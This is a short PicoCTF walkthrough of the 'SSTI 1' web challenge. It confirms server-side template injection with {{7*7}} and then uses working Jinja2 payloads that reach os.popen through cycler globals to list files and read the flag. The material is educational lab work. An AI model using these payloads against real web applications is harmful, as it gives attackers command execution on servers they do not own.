# 🛡️ PicoCTF Lab Walkthrough: SSTI 1

## 📌 Challenge Info
- **Category**: Web Exploitation
- **Difficulty**: Medium

---

## 📝 Challenge Description
The application was vulnerable to Server-Side Template Injection (SSTI) in an input field.

---

## 🔍 Initial Recon
- **Files provided**: None
- **Services/Ports**: Web application
- **Hints given**: None

---

## 🛠️ Tools & Commands Used
| Tool / Command | Purpose |
|----------------|---------|
| SSTI payloads | Test template injection |
| OS commands | File access |

---

## 🧠 Step-by-Step Solution
1. Tested:  
{{7*7}}  
Response: `49` → SSTI confirmed.

2. Directory listing:  
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}

3. Retrieved flag:  
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}

---

## 🧾 Flag
picoCTF{[actual_flag_here]}

---

## 📚 Learning Outcomes
- SSTI can lead to full RCE.
- Sanitizing template input is essential.

---

## 🔗 References
- [PortSwigger: SSTI](https://portswigger.net/research/server-side-template-injection)
